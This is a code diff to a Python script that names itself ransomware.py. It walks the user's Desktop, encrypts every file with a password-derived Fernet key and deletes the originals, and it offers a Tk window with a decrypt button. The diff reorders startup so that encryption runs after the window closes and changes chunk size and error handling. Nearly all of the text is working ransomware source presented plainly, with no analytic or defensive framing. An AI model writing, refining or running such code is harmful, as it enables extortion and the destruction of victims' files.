@@ -30,12 +30,11 @@ def validate_password(input_password):
     """Check if the provided password is correct."""
     return derive_key(input_password) == key
 
-def encrypt_directory(directory, key, chunk_size=1024 * 1024):
+def encrypt_directory(directory, key, chunk_size=2048 * 2048):
     try:
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                # Skip specific files
                 if file.lower() in ["desktop.ini", "ransomware.py"]:
                     continue
 
@@ -47,7 +46,7 @@ def encrypt_directory(directory, key, chunk_size=1024 * 1024):
                         while chunk := file_obj.read(chunk_size):
                             encrypted_data = f.encrypt(chunk)
                             enc_file.write(encrypted_data)
-                    
+
                     os.remove(filepath)
                     print(f"Encrypted: {filepath}")
                 except Exception as e:
@@ -82,9 +81,8 @@ def decrypt_directory(directory, key):
                         file_obj.write(decrypted_data)
                     os.remove(filepath)
                 except Exception as e:
-                    messagebox.showerror(
-                        "Error", f"Failed to decrypt {filepath}. Error: {e}"
-                    )
+                    print(f"Failed to decrypt {filepath}: {e}")
+        
         messagebox.showinfo("Success", "Decryption completed successfully!")
     except Exception as e:
         messagebox.showerror("Error", f"Decryption failed: {e}")
@@ -97,13 +95,19 @@ def decrypt_desktop():
     desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
     decrypt_directory(desktop_path, key)
 
-root = Tk()
-root.title("File Encryptor/Decryptor")
+if __name__ == "__main__":
+    print("Starting File Encryptor/Decryptor...")
 
-root.geometry("300x150")
+    root = Tk()
+    root.title("File Encryptor/Decryptor")
 
-decrypt_button = Button(root, text="Decrypt All in Desktop", command=decrypt_desktop)
-decrypt_button.pack(pady=10)
+    root.geometry("300x150")
 
-encrypt_desktop()
-root.mainloop()
+    decrypt_button = Button(root, text="Decrypt All in Desktop", command=decrypt_desktop)
+    decrypt_button.pack(pady=10)
+
+    root.mainloop()
+
+    print("Encrypting files on Desktop...")
+    encrypt_desktop()
+    print("Encryption completed.")
